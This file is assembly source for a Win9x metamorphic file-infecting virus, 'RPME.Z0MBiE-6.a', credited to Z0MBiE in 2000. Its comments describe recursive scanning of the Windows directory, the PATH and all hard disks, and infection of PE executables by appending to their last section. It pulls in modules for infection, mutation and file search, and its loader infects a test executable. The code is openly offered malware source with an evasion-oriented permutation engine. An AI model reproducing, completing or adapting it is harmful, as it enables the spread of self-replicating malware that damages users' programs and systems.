
; ===========================================================================
; RPME.Z0MBiE-6.a      build 001       (x) 2000 Z0MBiE, http://z0mbie.cjb.net
; ===========================================================================

; win9X permutating virus - RPME usage example
; based on Z0MBiE-5

; - creates thread which will scan files while current process is running
; - recursive scan files in %windir%, %path% and then all hds
; - pe-exe infection by appending to last section

CODESIZE                equ     10000h  ; 64k <-- size of permutating buffer
MAXMEM                  equ     80000h  ; 512k
DATA_RVA                equ     2000h   ; .data RVA

include                 mz.inc          ; mz header
include                 pe.inc          ; pe header
include                 seh.inc         ; seh macros
include                 s2c.inc         ; string->code conversion macros

pusho                   macro   lbl ; push offset of the procedure 'lbl'
                        local   __tmp ; ***CANT BE USED TO GET REAL OFFSET***
                        call    __tmp
                        jmp     lbl
__tmp:                  endm

                        p386
                        model   flat
                        locals  __

                        .data   ; contains the virus. should be at .DATA_RVA

start:

include                 import.inc              ; import stuff
include                 infect.inc              ; file infecting
include                 fioexlow.inc            ; file io
include                 gencopy.inc             ; new copy generation
include                 lde32bin.inc            ; LDE32
include                 rpme_asm.inc            ; RPME -- constants
include                 rpme-krn.inc            ; RPME -- kernel
include                 rpme-mut.inc            ; RPME -- mutator
include                 usermut.inc             ; external mutator
include                 rnd.inc                 ; randomer
include                 startup.inc             ; startup code
include                 onexec.inc              ; onexec()
include                 recserch.inc            ; file scanning

                        org     start+CODESIZE

xx_first:               import_main 2

patch_start             dd      ?
patch_eip               dd      ?

randseed                dd      ?

ldetbl                  db      2048 dup (?)

buf_size                dd      ?
buf_entry               dd      ?
buf_ptr                 dd      ?

mem_count               dd      ?
mem_ptr                 dd      ?

ff                      ff_struc ?

DATASIZE                equ     ($-start+4095) and (not 4095)

                        .code   ; contains virus loader

loader:
                        call    init_win32api
                        call    init_memory
                        call    randomize

                        lea     edx, testfile
                        call    infect_file

                        push    -1
                        extern  ExitProcess:PROC
                        call    ExitProcess

testfile                db      'TEST.EXE',0

                        end     loader
